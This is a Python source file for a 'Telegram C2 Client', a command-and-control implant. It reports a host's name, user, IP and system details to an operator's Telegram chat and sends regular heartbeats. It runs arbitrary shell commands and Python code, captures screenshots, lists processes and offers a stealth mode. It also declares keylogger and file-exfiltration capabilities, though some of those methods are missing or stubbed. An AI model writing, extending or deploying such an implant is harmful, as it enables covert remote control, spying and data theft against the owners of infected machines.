#!/usr/bin/env python3
"""
Telegram C2 Client
"""

import requests
import json
import time
import platform
import socket
import subprocess
import threading
import uuid
import base64
import os
import sys
import psutil
import logging
from datetime import datetime
from pathlib import Path
import argparse
import signal
import hashlib
import zipfile
import tempfile
import shutil
import getpass

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pynput
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

from telegram import Bot


class TelegramC2Client:
    def __init__(self, bot_token, target_chat_id, client_id=None, display_name=None, beacon_interval=30,
                 stealth_mode=False, capabilities=None):
        self.bot_token = bot_token
        self.target_chat_id = target_chat_id
        self.bot = Bot(token=self.bot_token)

        self.client_id = client_id or "tg_client_{}".format(uuid.uuid4().hex[:8])
        self.display_name = display_name
        self.beacon_interval = beacon_interval
        self.running = False
        self.stealth_mode = stealth_mode
        self.capabilities = capabilities or {}

        self.keylogger_active = False
        self.keylogger_thread = None
        self.logged_keys = []

        self.setup_logging()

        self.temp_dir = tempfile.mkdtemp(prefix="telegram_c2_client_")
        self.logger.info("Client temp directory: {}".format(self.temp_dir))

    def setup_logging(self):
        log_level = logging.WARNING if self.stealth_mode else logging.INFO

        log_file = os.path.join(self.temp_dir, "client.log") if hasattr(self, 'temp_dir') else "client.log"
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler() if not self.stealth_mode else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def get_system_info(self):
        try:
            hostname = socket.gethostname()
            username = getpass.getuser()
            os_info = "{} {} {}".format(platform.system(), platform.release(), platform.version())
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
            except Exception:
                ip_address = "127.0.0.1"
            finally:
                s.close()
            cpu_count = psutil.cpu_count()
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            system_info = {
                "agent_id": self.client_id,
                "display_name": self.display_name or self.client_id,
                "hostname": hostname,
                "username": username,
                "os_info": os_info,
                "ip_address": ip_address,
                "port": 0,
                "cpu_count": cpu_count,
                "memory_total": memory.total,
                "memory_available": memory.available,
                "disk_total": disk.total,
                "disk_free": disk.free,
                "python_version": sys.version,
                "architecture": platform.architecture()[0],
                "machine": platform.machine(),
                "processor": platform.processor(),
                "boot_time": psutil.boot_time(),
                "pid": os.getpid(),
                "cwd": os.getcwd(),
                "capabilities": self.capabilities
            }
            return system_info
        except Exception as e:
            self.logger.error("Error getting system info: {}".format(e))
            return None

    async def register(self):
        system_info = self.get_system_info()
        if not system_info:
            return False
        try:
            registration_payload = json.dumps(system_info, indent=2)
            message_text = f"/register_agent\n\n{registration_payload}"
            await self.bot.send_message(chat_id=self.target_chat_id, text=message_text)
            self.logger.info("Registration message sent to server via Telegram.")
            return True
        except Exception as e:
            self.logger.error("Error sending registration message via Telegram: {}".format(e))
            return False

    async def send_heartbeat(self):
        try:
            heartbeat_message = f"/heartbeat {self.client_id}"
            await self.bot.send_message(chat_id=self.target_chat_id, text=heartbeat_message)
            self.logger.debug("Heartbeat sent to server via Telegram.")
            return True
        except Exception as e:
            self.logger.error("Error sending heartbeat via Telegram: {}".format(e))
            return False

    async def submit_result(self, command_id, result, success, additional_data=None):
        try:
            result_payload = {
                "command_id": command_id,
                "agent_id": self.client_id,
                "result": str(result),
                "success": success,
                "timestamp": datetime.now().isoformat()
            }
            if additional_data:
                result_payload["additional_data"] = additional_data
            result_json = json.dumps(result_payload, indent=2)
            message_text = f"/command_result\n\n{result_json}"
            await self.bot.send_message(chat_id=self.target_chat_id, text=message_text)
            self.logger.info(f"Result for command {command_id} sent via Telegram.")
            return True
        except Exception as e:
            self.logger.error("Error sending result via Telegram: {}".format(e))
            return False

    def execute_command(self, command, command_type="shell"):
        try:
            if command_type == "shell":
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                output = result.stdout + result.stderr
                success = result.returncode == 0
                return {
                    "result": output,
                    "success": success,
                    "return_code": result.returncode
                }
            elif command_type == "python":
                try:
                    exec_globals = {"__builtins__": __builtins__}
                    exec_locals = {}
                    exec(command, exec_globals, exec_locals)
                    return {
                        "result": "Python code executed successfully",
                        "success": True,
                        "return_code": 0
                    }
                except Exception as e:
                    return {
                        "result": "Python execution error: {}".format(str(e)),
                        "success": False,
                        "return_code": 1
                    }
            else:
                return {
                    "result": "Unknown command type: {}".format(command_type),
                    "success": False,
                    "return_code": 1
                }
        except subprocess.TimeoutExpired:
            return {
                "result": "Command timed out",
                "success": False,
                "return_code": 124
            }
        except Exception as e:
            return {
                "result": "Error executing command: {}".format(str(e)),
                "success": False,
                "return_code": 1
            }

    def take_screenshot(self):
        if not self.capabilities.get("screenshot", False):
            return {"result": "Screenshot capability not enabled", "success": False}
        if not PIL_AVAILABLE:
            return {"result": "PIL not available. Install with: pip install Pillow", "success": False}
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot_path = os.path.join(self.temp_dir, "screenshot_{}.png".format(int(time.time())))
            screenshot.save(screenshot_path)
            with open(screenshot_path, "rb") as f:
                image_data = base64.b64encode(f.read()).decode('utf-8')
            os.remove(screenshot_path)
            return {
                "result": "Screenshot captured successfully",
                "success": True,
                "image_data": image_data,
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            return {"result": "Screenshot error: {}".format(str(e)), "success": False}

    def get_processes(self):
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'create_time']):
                try:
                    proc_info = proc.info
                    proc_info['create_time'] = datetime.fromtimestamp(proc_info['create_time']).isoformat()
                    processes.append(proc_info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            return {"result": "Process list retrieved", "success": True, "processes": processes, "count": len(processes)}
        except Exception as e:
            return {"result": "Process enumeration error: {}".format(str(e)), "success": False}

    def process_commands(self):
        self.logger.warning("process_commands: Requires client to run its own bot to receive commands.")

    def cleanup(self):
        try:
            if self.keylogger_active:
                self.stop_keylogger()
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
            self.logger.info("Client cleanup completed")
        except Exception as e:
            self.logger.error("Cleanup error: {}".format(e))

    def run(self):
        self.logger.info("Starting Telegram C2 Client {}".format(self.client_id))
        import asyncio
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        if not loop.run_until_complete(self.register()):
            self.logger.error("Failed to register with server via Telegram. Exiting.")
            return
        self.running = True
        def signal_handler(signum, frame):
            self.logger.info("Received signal {}, shutting down...".format(signum))
            self.running = False
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        try:
            while self.running:
                loop.run_until_complete(self.send_heartbeat())
                self.process_commands()
                time.sleep(self.beacon_interval)
        except KeyboardInterrupt:
            self.logger.info("Client stopped by user")
        except Exception as e:
            self.logger.error("Client error: {}".format(e))
        finally:
            self.running = False
            self.cleanup()


def main():
    parser = argparse.ArgumentParser(description="Telegram C2 Client")
    parser.add_argument("--client-id", help="Custom client ID")
    parser.add_argument("--display-name", help="Display name for the client")
    parser.add_argument("--beacon-interval", type=int, default=30, help="Beacon interval in seconds")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    parser.add_argument("--bot-token", required=True, help="Telegram Bot Token for client to send messages")
    parser.add_argument("--server-chat-id", required=True, type=int, help="Chat ID of the server bot to send messages to")
    args = parser.parse_args()
    capabilities = {
        "screenshot": True,
        "keylogger": True,
        "file_exfiltration": True
    }
    client = TelegramC2Client(
        bot_token=args.bot_token,
        target_chat_id=args.server_chat_id,
        client_id=args.client_id,
        display_name=args.display_name,
        beacon_interval=args.beacon_interval,
        stealth_mode=args.stealth,
        capabilities=capabilities
    )
    try:
        client.run()
    except Exception as e:
        print("Client error: {}".format(e))
        sys.exit(1)


if __name__ == "__main__":
    main()


